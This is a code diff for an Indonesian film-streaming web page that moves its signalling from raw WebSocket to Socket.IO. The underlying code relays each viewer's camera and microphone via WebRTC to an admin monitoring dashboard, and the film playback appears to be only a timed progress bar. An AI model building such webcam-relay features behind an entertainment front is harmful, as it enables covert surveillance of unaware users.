@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -6,6 +5,7 @@
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <title>Layar Biru — Nonton Film</title>
 <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
 :root{
   --bg:#0A0E1A;--bg-soft:#111729;--card:#161D34;
@@ -444,15 +444,15 @@ let authToken      = sessionStorage.getItem('lb_token') || null;
 let adminLogs      = [];
 let mySessionId    = null;
 
-// WebSocket (untuk semua peran)
-let ws             = null;
+// Socket.IO (menggantikan WebSocket manual)
+let socket         = null;
 
-// WebRTC — VIEWER side (satu peer per admin yang connect)
-const viewerPeers  = new Map(); // adminId? — sederhana: satu RTCPeerConnection per request
+// WebRTC — VIEWER side
+const viewerPeers  = new Map();
 
-// WebRTC — ADMIN side (satu RTCPeerConnection per sessionId viewer)
-const adminPeers   = new Map(); // sessionId → { pc, videoEl, audioCtx, analyser, animRaf }
-const adminAudioMeters = new Map(); // sessionId → animRaf id
+// WebRTC — ADMIN side (sessionId → { pc, videoEl, audioCtx, analyser })
+const adminPeers       = new Map();
+const adminAudioMeters = new Map();
 
 // SSE
 let sseConnection  = null;
@@ -461,7 +461,6 @@ const CURRENT_FILM = 'Senja Terakhir Ep.4';
 
 const API_BASE = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
   ? 'http://localhost:3000' : '';
-const WS_BASE  = API_BASE.replace('http://', 'ws://').replace('https://', 'wss://');
 
 // ================================================================
 // NAVIGATION
@@ -556,16 +555,15 @@ function enterAdminDashboard(){
   document.getElementById('admin-username').textContent = `Masuk sebagai: ${currentUser.name} (${currentUser.email})`;
   addAdminLog(currentUser.name, 'membuka dashboard admin', '#A855F7');
   connectSSE();
-  connectWS_Admin();
+  connectSocket_Admin();
 }
 
 function adminLogout(){
   if(!confirm('Yakin ingin logout?')) return;
-  // Tutup semua peer connections
   adminPeers.forEach((p) => { try { p.pc.close(); } catch{} });
   adminPeers.clear();
   if(sseConnection){ sseConnection.close(); sseConnection = null; }
-  if(ws){ ws.close(); ws = null; }
+  if(socket){ socket.disconnect(); socket = null; }
   if(authToken){
     fetch(`${API_BASE}/api/logout`, { method:'POST', headers:{'Authorization':`Bearer ${authToken}`} }).catch(()=>{});
     authToken = null;
@@ -612,58 +610,140 @@ function updateAdminStats(sessions){
 }
 
 // ================================================================
-// WEBSOCKET — ADMIN SIDE
+// SOCKET.IO — ADMIN SIDE
 // ================================================================
-function connectWS_Admin(){
-  if(ws) ws.close();
-  ws = new WebSocket(`${WS_BASE}/ws?token=${encodeURIComponent(authToken)}`);
+function connectSocket_Admin(){
+  if(socket) socket.disconnect();
 
-  ws.onopen = () => {
-    ws.send(JSON.stringify({ type:'register-admin' }));
-    addAdminLog('Sistem', 'WebSocket signaling terhubung', '#4ADE80');
-  };
+  socket = io(API_BASE, {
+    auth: { token: authToken },
+    transports: ['polling', 'websocket'],  // mulai dengan polling, upgrade ke WS otomatis
+    reconnection: true,
+    reconnectionAttempts: Infinity,
+    reconnectionDelay: 1000,
+    reconnectionDelayMax: 5000
+  });
 
-  ws.onmessage = (e) => {
-    const msg = JSON.parse(e.data);
+  socket.on('connect', () => {
+    socket.emit('register-admin');
+    addAdminLog('Sistem', 'Signaling terhubung ✓', '#4ADE80');
+    const dot = document.getElementById('sse-dot');
+    if(dot) dot.className = 'sse-dot connected';
+  });
 
-    // Daftar viewer yang sudah online saat admin baru join
-    if(msg.type === 'viewer-list'){
-      msg.viewers.forEach(v => {
-        addViewerCard(v.sessionId, v.user);
-        initiateWebRTC(v.sessionId);
-      });
+  socket.on('disconnect', (reason) => {
+    addAdminLog('Sistem', `Signaling terputus (${reason}), reconnect otomatis...`, '#F2A93B');
+    const dot = document.getElementById('sse-dot');
+    if(dot) dot.className = 'sse-dot error';
+  });
+
+  socket.on('reconnect', () => {
+    addAdminLog('Sistem', 'Reconnect berhasil ✓', '#4ADE80');
+    const dot = document.getElementById('sse-dot');
+    if(dot) dot.className = 'sse-dot connected';
+  });
+
+  socket.on('viewer-list', ({ viewers }) => {
+    viewers.forEach(v => {
+      addViewerCard(v.sessionId, v.user);
+      initiateWebRTC(v.sessionId);
+    });
+  });
+
+  socket.on('viewer-connected', (msg) => {
+    addAdminLog(msg.user.name, 'terhubung — memulai WebRTC stream', '#4ADE80');
+    addViewerCard(msg.sessionId, msg.user);
+    initiateWebRTC(msg.sessionId);
+  });
+
+  socket.on('viewer-disconnected', (msg) => {
+    addAdminLog('Pengguna', 'mengakhiri sesi', '#F2A93B');
+    removeViewerCard(msg.sessionId);
+  });
+
+  socket.on('answer', (msg) => {
+    const entry = adminPeers.get(msg.sessionId);
+    if(entry) entry.pc.setRemoteDescription(new RTCSessionDescription(msg.data)).catch(()=>{});
+  });
+
+  socket.on('ice-candidate', (msg) => {
+    if(msg.from !== 'viewer') return;
+    const entry = adminPeers.get(msg.sessionId);
+    if(entry) entry.pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(()=>{});
+  });
+
+  socket.on('connect_error', (err) => {
+    addAdminLog('Sistem', `Koneksi gagal: ${err.message}`, '#F2716B');
+  });
+}
+
+// ================================================================
+// SOCKET.IO — VIEWER SIDE
+// ================================================================
+function connectSocket_Viewer(){
+  if(socket) socket.disconnect();
+
+  socket = io(API_BASE, {
+    auth: { token: authToken },
+    transports: ['polling', 'websocket'],
+    reconnection: true,
+    reconnectionAttempts: Infinity,
+    reconnectionDelay: 1000,
+    reconnectionDelayMax: 5000
+  });
+
+  socket.on('connect', () => {
+    socket.emit('register-viewer', { sessionId: mySessionId });
+  });
+
+  socket.on('reconnect', () => {
+    // Daftar ulang setelah reconnect
+    socket.emit('register-viewer', { sessionId: mySessionId });
+  });
+
+  socket.on('offer', async (msg) => {
+    await handleAdminOffer(msg.data);
+  });
+
+  socket.on('ice-candidate', (msg) => {
+    if(msg.from !== 'admin') return;
+    const pc = viewerPeers.get('main');
+    if(pc) pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(()=>{});
+  });
+}
+
+// VIEWER: proses offer dari admin, kirim answer + stream kamera
+async function handleAdminOffer(offerDesc){
+  let pc = viewerPeers.get('main');
+
+  if(!pc || pc.signalingState === 'closed'){
+    pc = new RTCPeerConnection({
+      iceServers: [
+        { urls:'stun:stun.l.google.com:19302' },
+        { urls:'stun:stun1.l.google.com:19302' },
+        { urls:'stun:stun2.l.google.com:19302' }
+      ]
+    });
+    viewerPeers.set('main', pc);
+
+    if(camStream){
+      camStream.getTracks().forEach(track => pc.addTrack(track, camStream));
     }
 
-    // Viewer baru connect
-    if(msg.type === 'viewer-connected'){
-      addAdminLog(msg.user.name, 'terhubung — memulai WebRTC stream', '#4ADE80');
-      addViewerCard(msg.sessionId, msg.user);
-      initiateWebRTC(msg.sessionId);
-    }
+    pc.onicecandidate = (e) => {
+      if(e.candidate && socket?.connected){
+        socket.emit('ice-candidate', {
+          from:'viewer', sessionId: mySessionId, data: e.candidate
+        });
+      }
+    };
+  }
 
-    // Viewer disconnect
-    if(msg.type === 'viewer-disconnected'){
-      addAdminLog('Pengguna', 'mengakhiri sesi', '#F2A93B');
-      removeViewerCard(msg.sessionId);
-    }
+  await pc.setRemoteDescription(new RTCSessionDescription(offerDesc));
+  const answer = await pc.createAnswer();
+  await pc.setLocalDescription(answer);
 
-    // WebRTC: SDP answer dari viewer
-    if(msg.type === 'answer'){
-      const entry = adminPeers.get(msg.sessionId);
-      if(entry) entry.pc.setRemoteDescription(new RTCSessionDescription(msg.data));
-    }
-
-    // WebRTC: ICE candidate dari viewer
-    if(msg.type === 'ice-candidate' && msg.from === 'viewer'){
-      const entry = adminPeers.get(msg.sessionId);
-      if(entry) entry.pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(()=>{});
-    }
-  };
-
-  ws.onclose = () => {
-    addAdminLog('Sistem', 'WebSocket terputus', '#F2716B');
-    setTimeout(() => { if(currentUser?.role==='admin') connectWS_Admin(); }, 3000);
-  };
+  socket.emit('answer', { sessionId: mySessionId, data: pc.localDescription });
 }
 
 // ================================================================
@@ -708,10 +788,10 @@ async function initiateWebRTC(sessionId){
   };
 
   pc.onicecandidate = (e) => {
-    if(e.candidate){
-      ws.send(JSON.stringify({
-        type: 'ice-candidate', from:'admin', sessionId, data: e.candidate
-      }));
+    if(e.candidate && socket?.connected){
+      socket.emit('ice-candidate', {
+        from:'admin', sessionId, data: e.candidate
+      });
     }
   };
 
@@ -735,9 +815,7 @@ async function initiateWebRTC(sessionId){
   });
   await pc.setLocalDescription(offer);
 
-  ws.send(JSON.stringify({
-    type: 'offer', sessionId, data: pc.localDescription
-  }));
+  socket.emit('offer', { sessionId, data: pc.localDescription });
 }
 
 // ================================================================
@@ -894,77 +972,6 @@ function removeViewerCard(sessionId){
 }
 
 // ================================================================
-// WEBSOCKET — VIEWER SIDE
-// ================================================================
-function connectWS_Viewer(){
-  if(ws) ws.close();
-  ws = new WebSocket(`${WS_BASE}/ws?token=${encodeURIComponent(authToken)}`);
-
-  ws.onopen = () => {
-    ws.send(JSON.stringify({ type:'register-viewer', sessionId: mySessionId }));
-  };
-
-  ws.onmessage = async (e) => {
-    const msg = JSON.parse(e.data);
-
-    // Terima offer dari admin
-    if(msg.type === 'offer'){
-      await handleAdminOffer(msg.data);
-    }
-
-    // Terima ICE candidate dari admin
-    if(msg.type === 'ice-candidate' && msg.from === 'admin'){
-      const pc = viewerPeers.get('main');
-      if(pc) pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(()=>{});
-    }
-  };
-
-  ws.onclose = () => {
-    // Reconnect otomatis
-    setTimeout(() => {
-      if(camStream && mySessionId) connectWS_Viewer();
-    }, 2000);
-  };
-}
-
-// VIEWER: proses offer dari admin, kirim answer + stream kamera
-async function handleAdminOffer(offerDesc){
-  let pc = viewerPeers.get('main');
-
-  // Buat peer baru jika belum ada / sudah closed
-  if(!pc || pc.signalingState === 'closed'){
-    pc = new RTCPeerConnection({
-      iceServers: [
-        { urls:'stun:stun.l.google.com:19302' },
-        { urls:'stun:stun1.l.google.com:19302' }
-      ]
-    });
-    viewerPeers.set('main', pc);
-
-    // Tambahkan track kamera & mikrofon ke peer
-    if(camStream){
-      camStream.getTracks().forEach(track => pc.addTrack(track, camStream));
-    }
-
-    pc.onicecandidate = (e) => {
-      if(e.candidate && ws.readyState === WebSocket.OPEN){
-        ws.send(JSON.stringify({
-          type:'ice-candidate', from:'viewer', sessionId: mySessionId, data: e.candidate
-        }));
-      }
-    };
-  }
-
-  await pc.setRemoteDescription(new RTCSessionDescription(offerDesc));
-  const answer = await pc.createAnswer();
-  await pc.setLocalDescription(answer);
-
-  ws.send(JSON.stringify({
-    type:'answer', sessionId: mySessionId, data: pc.localDescription
-  }));
-}
-
-// ================================================================
 // CAMERA CONSENT
 // ================================================================
 async function requestCamera(){
@@ -1029,8 +1036,8 @@ async function startWatchSession(){
     if(prog>=100) clearInterval(vidProgressInterval);
   }, 500);
 
-  // Hubungkan ke WebSocket signaling
-  connectWS_Viewer();
+  // Hubungkan ke Socket.IO signaling
+  connectSocket_Viewer();
 }
 
 function endSession(){
@@ -1052,8 +1059,8 @@ async function stopSession(showEnded=true){
   viewerPeers.forEach(pc => { try{ pc.close(); }catch{} });
   viewerPeers.clear();
 
-  // Tutup WS
-  if(ws){ ws.close(); ws = null; }
+  // Disconnect socket
+  if(socket){ socket.disconnect(); socket = null; }
 
   // Logout API
   if(authToken){
@@ -1118,6 +1125,7 @@ window.addEventListener('beforeunload', () => {
   if(camStream) camStream.getTracks().forEach(t => t.stop());
   viewerPeers.forEach(pc => { try{pc.close();}catch{} });
   adminPeers.forEach(e => { try{e.pc.close();}catch{} });
+  if(socket) socket.disconnect();
   if(authToken) navigator.sendBeacon(`${API_BASE}/api/logout`, '{}');
 });
 window.addEventListener('pagehide', () => {
